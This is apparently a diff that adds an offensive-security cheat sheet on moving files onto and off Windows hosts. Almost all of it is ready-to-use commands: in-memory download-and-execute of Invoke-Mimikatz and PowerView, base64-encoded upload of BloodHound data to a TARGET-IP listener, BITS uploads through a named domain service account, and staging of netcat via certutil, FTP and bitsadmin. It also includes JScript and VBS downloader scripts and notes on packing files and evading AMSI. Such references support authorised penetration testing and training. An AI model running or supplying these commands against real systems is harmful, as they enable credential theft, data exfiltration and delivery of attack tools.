@@ -1,0 +1,140 @@
+WINDOWS
+===============================================================================================================================
+
+POWERSHELL (Downloads)
+
+PS C:\User> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
+
+PS C:\User> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+
+-> In memory:
+PS C:\User> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+
+PS C:\User> Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
+
+-> If the Internet Explorer first-launch configuration has not been completed, it's possible to bypass that with "-UseBasicParsing":
+PS C:\User> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
+
+With admin access it is possible to disable that feature via the registry:
+C:\User> reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+POWERSHELL (Uploads)
+
+1. -> Store the command in a base64 encoded string on the host:
+PS C:\User> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
+PS C:\User> Invoke-WebRequest -Uri http://TARGET-IP:PORT -Method POST -Body $b64
+
+2. -> Decode the received data:
+$ echo <base64> | base64 -d -w 0 > bloodhound.zip
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+BITSADMIN (Background Intelligente Transfer Service)
+
+PS C:\User> bitsadmin /transfer n http://TARGET-IP/nc.exe C:\Temp\nc.exe
+
+-> Download (Powershell/Bitsadmin):
+PS C:\User> Import-Module bitstransfer;Start-BitsTransfer -Source "http://TARGET-IP/nc.exe" -Destination "C:\Temp\nc.exe"
+
+-> Upload (Powershell/Bitsadmin):
+PS C:\User> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://TARGET-IP/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+CERTUTIL (Detected by AMSI)
+
+C:\User> certutil.exe -verifyctl -split -f http://TARGET-IP/nc.exe
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+FTP (Windows 10 includes a native FTP client, which can also read commands from a script to work in a non-interactive shell)
+
+-> ftp_script.txt:
+
+open TARGET-IP
+anonymous
+anonymous
+lcd C:\Temp
+get nc.exe
+quit
+
+-> Transfer:
+PS C:\User> ftp -s:ftp-script.txt
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+TFTP (The TFTP client is not available by default in Windows, but it can be enabled using DISM)
+
+-> Enable TFTP:
+1. PS C:\User> DISM /online /Enable-Feature /FeatureName:TFTP
+2. PS C:\User> Install-WindowsFeature TFTP-Client
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+ECHO COPY (for restricted environments)
+
+1. -> Pack the file:
+$ upx --best nc.exe
+
+2. -> Convert binary to base64:
+PS C:\User> certutil.exe -encode nc.exe nc.txt
+
+3. -> Open file in a text editor: 
+Replace newlines with 'echo "'
+Replace \r with " >> nc.txt\r
+If the last line has an echo " on its own, remove it
+
+4. -> Convert the base64 back to binary:
+PS C:\User> certutil.exe -decode nc.txt nc.exe
+PS C:\User> cmd /c "nc.exe -h 2>&1"
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+OPENSSL Base64
+
+-> Encryption:
+PS C:\User> openssl.exe enc -base64 -in nc.exe -out nc.txt
+
+-> Decryption:
+PS C:\User> openssl.exe enc -base64 -d -in nc.txt -out nc.exe
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+JAVASCRIPT
+
+-> wget.js:
+
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+
+-> Execute the script:
+PS C:\User> cscript /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+VBS
+
+-> wget.vbs:
+
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+
+-> Execute the script:
+PS C:\User> cscript /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
